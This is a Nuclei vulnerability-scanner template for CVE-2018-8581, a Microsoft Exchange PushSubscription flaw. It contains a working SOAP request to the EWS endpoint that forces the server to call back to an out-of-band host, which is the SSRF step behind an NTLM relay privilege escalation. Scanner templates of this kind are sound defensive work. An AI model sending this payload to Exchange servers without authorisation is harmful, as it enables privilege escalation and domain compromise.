http/cves/2018/CVE-2018-8581.yaml

id: CVE-2018-8581

info:
  name: Microsoft Exchange Server - Elevation of Privilege (PushSubscription)
  author: BotGJ16
  severity: high
  description: |
    Microsoft Exchange Server contains a vulnerability in the PushSubscription feature 
    allowing NTLM Relay attacks. An authenticated attacker can escalate their privileges 
    by triggering an SSRF via a Push Notification subscription request.
  reference:
    - https://vulncheck.com/xdb/276c34c7f74f
    - https://github.com/Ridter/Exchange2domain
    - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8581
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2018-8581
    cwe-id: CWE-269
  metadata:
    max-request: 1
    shodan-query: cpe:"cpe:2.3:a:microsoft:exchange_server"
    verified: true
  tags: cve,cve2018,exchange,ews,ntlm,relay,oast,ssrf

http:
  - method: POST
    path:
      - "{{BaseURL}}/ews/exchange.asmx"

    body: |
      <?xml version="1.0" encoding="utf-8"?>
      <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
                     xmlns:t="http://schemas.microsoft.com/exchange/services/2004/types"
                     xmlns:m="http://schemas.microsoft.com/exchange/services/2004/messages">
        <soap:Header>
          <t:RequestServerVersion Version="Exchange2010" />
        </soap:Header>
        <soap:Body>
          <m:Subscribe>
            <m:PushSubscriptionRequest SubscribeToAllFolders="true">
              <t:URL>http://{{interactsh-url}}</t:URL>
              <t:StatusFrequency>1</t:StatusFrequency>
            </m:PushSubscriptionRequest>
          </m:Subscribe>
        </soap:Body>
      </soap:Envelope>

    headers:
      Content-Type: text/xml; charset=utf-8
      Accept: text/xml
      User-Agent: Nuclei - Open Source Project (https://github.com/projectdiscovery/nuclei)
      Connection: close

    matchers-condition: or
    matchers:
      - type: word
        part: interactsh_protocol # Complete POC via OAST callback
        words:
          - "http"
          - "dns"

      - type: word
        part: body
        words:
          - "m:SubscribeResponse"
          - "m:ResponseCode>NoError"
        condition: and

      - type: word
        part: header
        words:
          - "Www-Authenticate: NTLM"
          - "X-Feserver"
        condition: and
